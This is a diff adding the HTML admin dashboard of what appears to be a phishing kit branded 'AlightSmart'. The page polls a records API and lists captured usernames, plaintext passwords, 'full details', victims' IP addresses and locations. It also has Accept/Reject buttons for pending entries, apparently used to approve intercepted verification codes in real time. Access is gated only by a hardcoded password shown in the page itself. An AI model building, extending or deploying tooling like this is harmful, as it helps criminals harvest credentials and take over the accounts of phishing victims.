@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AlightSmart Admin</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f1f5f9; padding: 15px; }
+        .container { max-width: 1400px; margin: auto; background: white; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .header { background: #1e40af; color: white; padding: 20px; text-align: center; }
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 14px; text-align: left; border-bottom: 1px solid #ddd; }
+        th { background: #e2e8f0; font-weight: 600; }
+        tr:hover { background: #f8fafc; }
+        .btn { padding: 6px 12px; margin: 3px; border: none; border-radius: 6px; cursor: pointer; font-size: 0.9rem; }
+        .accept { background: #22c55e; color: white; }
+        .reject { background: #ef4444; color: white; }
+        .delete { background: #64748b; color: white; }
+        .refresh-btn { background: #3b82f6; color: white; padding: 12px 25px; border: none; border-radius: 8px; margin: 10px; font-weight: 600; }
+        .clear-btn { background: #ef4444; color: white; padding: 12px 25px; border: none; border-radius: 8px; margin: 10px; }
+        .status { text-align: center; padding: 12px; background: #f0f9ff; color: #0369a1; font-weight: 500; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 AlightSmart Admin Dashboard</h1>
+            <p>Live Records • Password: tunde6035</p>
+        </div>
+
+        <div class="status" id="status">Loading records...</div>
+
+        <button class="refresh-btn" onclick="forceRefresh()">🔄 Force Refresh Now</button>
+        <button class="clear-btn" onclick="clearRecords()">🗑️ Clear All Records</button>
+
+        <table id="recordsTable">
+            <thead>
+                <tr>
+                    <th>Time</th>
+                    <th>Type</th>
+                    <th>Username</th>
+                    <th>Password</th>
+                    <th>Full Details</th>
+                    <th>IP Address</th>
+                    <th>Location</th>
+                    <th>Action</th>
+                </tr>
+            </thead>
+            <tbody></tbody>
+        </table>
+    </div>
+
+    <script>
+        const ADMIN_PASSWORD = "tunde6035";
+
+        async function loadRecords() {
+            try {
+                const res = await fetch('/api/records?' + Date.now(), {
+                    cache: 'no-store',
+                    headers: { 'Cache-Control': 'no-cache' }
+                });
+                const records = await res.json();
+                const tbody = document.querySelector('#recordsTable tbody');
+                tbody.innerHTML = "";
+
+                document.getElementById('status').textContent = `✅ ${records.length} Records Loaded`;
+
+                records.forEach(r => {
+                    let action = '';
+                    if (r.address && r.address.includes("Pending")) {
+                        action = `
+                            <button class="btn accept" onclick="confirmCode(${r.id}, 'Confirmed')">Accept</button>
+                            <button class="btn reject" onclick="confirmCode(${r.id}, 'Rejected')">Reject</button>
+                        `;
+                    } else {
+                        action = r.address && r.address.includes("Confirmed") ? "✅ Confirmed" : "❌ Rejected";
+                    }
+
+                    tbody.innerHTML += `
+                        <tr>
+                            <td>${r.timestamp || '-'}</td>
+                            <td>${r.type || '-'}</td>
+                            <td><strong>${r.username || '-'}</strong></td>
+                            <td><code>${r.password || '-'}</code></td>
+                            <td style="max-width:500px; word-break:break-all;">${r.address || '-'}</td>
+                            <td>${r.ip || 'Unknown'}</td>
+                            <td>${r.location || 'Unknown'}</td>
+                            <td>
+                                ${action}
+                                <button class="btn delete" onclick="deleteRecord(${r.id})">🗑️ Delete</button>
+                            </td>
+                        </tr>`;
+                });
+            } catch (e) {
+                document.getElementById('status').innerHTML = "❌ Error loading - Click Force Refresh";
+            }
+        }
+
+        async function confirmCode(id, status) {
+            if (confirm(`Mark as ${status}?`)) {
+                await fetch('/api/confirm-code', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id, status })
+                });
+                loadRecords();
+            }
+        }
+
+        async function deleteRecord(id) {
+            if (confirm("Delete this single record?")) {
+                await fetch('/api/delete-record', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ id })
+                });
+                loadRecords();
+            }
+        }
+
+        async function clearRecords() {
+            if (confirm("Delete ALL records?")) {
+                await fetch('/api/clear', { method: 'POST' });
+                loadRecords();
+            }
+        }
+
+        function forceRefresh() {
+            document.getElementById('status').innerHTML = "🔄 Forcing Refresh...";
+            loadRecords();
+        }
+
+        window.onload = () => {
+            const pass = prompt("Enter Admin Password:");
+            if (pass !== ADMIN_PASSWORD) {
+                alert("❌ Wrong Password");
+                window.location.href = "/";
+                return;
+            }
+            loadRecords();
+            setInterval(loadRecords, 2000);
+        };
+    </script>
+</body>
+</html>
